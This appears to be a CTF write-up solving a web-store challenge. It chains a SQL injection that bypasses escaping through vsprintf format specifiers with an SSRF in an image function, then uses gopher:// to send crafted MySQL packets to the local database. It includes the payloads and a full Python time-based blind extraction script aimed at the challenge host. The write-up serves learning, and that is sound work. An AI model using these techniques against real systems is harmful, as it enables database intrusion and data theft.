So lets continue with the most hard task in this ctf , suggest you to try it , its still up for some days 

Ok the task was about web store , so you can buy some Tet as the task name :p 
![image](https://user-images.githubusercontent.com/7364615/35495325-aeef2cf4-04c0-11e8-86f0-f052c75800f8.png)

The orgz put also source code so we can check and and look for vuln part  `http://128.199.179.156/src.tar.gz`

Lets start look at the code and try to get it :D

Later , we can see that there is some place where we can control it 

![image](https://user-images.githubusercontent.com/7364615/35495452-40e69278-04c1-11e8-91d8-6ebf64cd8975.png)

`$_GET['uid']` was passed directly to the query , but thats was not so easy guys :p , there was filter for sure :D 

![image](https://user-images.githubusercontent.com/7364615/35495516-8042b1e0-04c1-11e8-94b7-743351c9c730.png)

`mysqli_real_escape_string` was here waiting for us , but there is little mistake here make all code weak 

![image](https://user-images.githubusercontent.com/7364615/35495681-6aa36d6a-04c2-11e8-956b-fd649c4cacd9.png)

So here vsprintf work as in C ,we can exploit it like format string 

So let me show my friend final exploit which maked us enable to manage the sqli and control it 100%

`
%1$c and 1=2 union select 1,2,0x66496c653a2f2f2f7661722f7777772f68746d6c2f6f6b2e6a7067 -- -
`

`
PS : 0x66496c653a2f2f2f7661722f7777772f68746d6c2f6f6b2e6a7067 = fIle:///var/www/html/ok.jpg 
`

So let me explain this payload to make it easy for you 

Here we have 

`
$prepare_qr = $jdb->addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s",  $_GET['uid']);
$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);
$result = $jdb->fetch_assoc($prepare_qr);
`

means here if we manipulate something how we can inject quote without make the filter remove it 

As we have `vsprintf`, we can send %c and convert any ASCII code to char 

`
%c - The character according to the ASCII value
`

means if our unsername : %1$c it will put ASCII code in our query but converted to char 

`
39 = > '
`

and thats all what we need to make the bypass here 

This is the normal query , notice in the code we have 2x prepares  of this query , which make us manipulate the gid again :D 

`
SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%s' and user='%s';
`

Lets see Hacker query :D

Note first the username:

```
Username : 39 /*test*/ 

(39 already used :D  , test as comment so its 39 only in final query)
```

`
SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%1$c and 1=2 union select 1,2,0x66496c653a2f2f2f7661722f7777772f68746d6c2f6f6b2e6a7067 -- -' and user='39 /*test*/';
`

Here %1$c will be replaced by 39 and as we used %c it will do the job for us :D , so it will be single quote HaHa

And here the SQL done ! next please :D 

For sure we cant extract the flag from database usign just SQLI, because the user used here have just access to on database and not flag database

![image](https://user-images.githubusercontent.com/7364615/35496299-bd177d72-04c5-11e8-8dba-84c3ce376e40.png)

So we have 3 column extracted from the database, the 3rd one is sended to watermark_me, lets take a look at it

![image](https://user-images.githubusercontent.com/7364615/35496319-e35a5f0e-04c5-11e8-8d26-25ca499a8b3a.png)

It just do some image stuff , but our input sended to get_data which end us to exploit SSRF :D WHAT A DAY

OK, here we will use the SSRF to extract flag from database using the use already with privilege ,which is fl4g_m4n4g3r as mention in code

To do this we need to communicate with mysql , gopher can do this for us

So what we will do to make this as fast as we can , is the setup all this locally and check mysql traffic using

`
tcpdump -i lo -n dst port 3306 -w mysql.pcap
`

Then we just check the packet and make use it to exploit this last step 

unfortunately in our exploit we was missing the QUIT request ,then we notice that and make the exploit work perfectly

Here we choice to make `time based blind sql injection` 

Here is the final exploit 

```
#!/bin/bash
import struct 
import binascii
from binascii import hexlify
import requests
import time

cookies = {
    'PHPSESSID': '5icps1lfga9oqrsr5enundodv6',
}

auth = bytearray([0xb6, 0x0, 0x0,0x1,0x05, 0xa2, 0x3f, 0x00,0x00,0x00,0x00,0x01,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00] 
    + list(b'fl4g_m4n4g3r') + [0x00,0x00,0x6d,0x79,0x73,0x71,0x6c,0x5f,0x6e,0x61,0x74,0x69,0x76,0x65,0x5f,0x70,0x61,0x73,0x73,0x77,0x6f,0x72,0x64,0x00,0x71,0x03,0x5f,0x6f,0x73,0x10,0x64,0x65,0x62,0x69,0x61,0x6e,0x2d,0x6c,0x69,0x6e,0x75,0x78,0x2d,0x67,0x6e,0x75,0x0c,0x5f,0x63,0x6c,0x69,0x65,0x6e,0x74,0x5f,0x6e,0x61,0x6d,0x65,0x08,0x6c,0x69,0x62,0x6d,0x79,0x73,0x71,0x6c,0x04,0x5f,0x70,0x69,0x64,0x05,0x31,0x30,0x37,0x30,0x35,0x0f,0x5f,0x63,0x6c,0x69,0x65,0x6e,0x74,0x5f,0x76,0x65,0x72,0x73,0x69,0x6f,0x6e,0x06,0x35,0x2e,0x36,0x2e,0x33,0x30,0x09,0x5f,0x70,0x6c,0x61,0x74,0x66,0x6f,0x72,0x6d,0x06,0x78,0x38,0x36,0x5f,0x36,0x34,0x0c,0x70,0x72,0x6f,0x67,0x72,0x61,0x6d,0x5f,0x6e,0x61,0x6d,0x65,0x05,0x6d,0x79,0x73,0x71,0x6c])

def encode(s):
    return ''.join(map(lambda x: "%{:02x}".format(x), list(s)))

flag = ""
while True:
    for i in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_!":
        cmd_arr = list(b"select flag from flag.flag where flag like '"+flag+i+"%' and sleep(5)")
        res = len(cmd_arr)+1
        cmd = struct.pack("<b", res) + bytearray([ 0x0, 0x0, 0x0, 0x03] + cmd_arr )
        quit_packet = bytearray([0x1, 0x0, 0x0, 0x0, 0x1])
        ddd = b"gopher://localhost:3306/A" + bytes(encode(auth + cmd + quit_packet))
        payload = "0x"+binascii.b2a_hex(ddd)
        t1 = time.time()
        url = "http://128.199.179.156/info.php?uid=%1$c%20and%201=2%20union%20select%201,2,"+payload+"%20--%20-"
        response = requests.get(url, cookies=cookies)
        t2 = time.time()
        if (t2 - t1) > 4.30:
            flag += i
            break
        print "time : "+str(t2 - t1)
        
    print flag

```
And the result :D 

![image](https://user-images.githubusercontent.com/7364615/35496852-0928447e-04c8-11e8-84b9-c83be6757662.png)

it was valid url , which give us the flag 

`
https://tinyurl.com/y9pplum3
`

![image](https://user-images.githubusercontent.com/7364615/35496901-3ba9a3b6-04c8-11e8-91c4-7292bc01d1dc.png)






